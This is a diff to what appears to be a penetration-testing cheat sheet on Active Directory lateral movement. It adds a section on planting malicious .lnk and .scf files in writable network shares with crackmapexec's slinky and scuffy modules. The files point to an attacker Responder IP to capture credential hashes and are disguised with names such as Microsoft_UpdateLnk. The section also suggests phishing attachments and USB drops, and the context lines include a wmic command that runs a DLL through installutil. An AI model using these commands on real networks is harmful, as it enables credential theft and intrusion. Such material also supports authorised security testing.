@@ -285,7 +285,14 @@ winrs -r:DC01.domain.com cmd
     ```powershell
     wmic /node:dc01.domain.com process call create "cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll"
     ```
-
+#### Creating lnk file in writable shares
+* None opsec safe
+* In my experience, IT noticed randomly generated folder names (not necessarily a file)
+* Still good to be inserted in phishing email attachments and USB drops (combine with knary)
+```
+crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M slinky -o SERVER=<ATTACKER_RESPONDER_IP> NAME=Microsoft_UpdateLnk
+crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M scuffy -o SERVER=<ATTACKER_RESPONDER_IP> NAME=Microsoft_UpdateScf
+```
 
 [^1]: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
 [^2]: [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
